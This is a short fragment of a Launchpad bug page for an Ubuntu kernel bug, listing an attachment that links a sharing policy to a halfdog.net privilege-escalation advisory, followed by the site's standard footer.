* [Sharing policy for http://www.halfdog.net/Security/2016/UserNamespaceOverlayfsXattrSetgidPrivilegeEscalation/](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/%2Battachment/4570628/%2Bfiles/policy.txt)
  [Edit](/ubuntu/%2Bsource/linux/%2Bbug/1534961/%2Battachment/4570628 "Change attachment details")

* [Add attachment](/ubuntu/%2Bsource/linux/%2Bbug/1534961/%2Baddcomment)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))


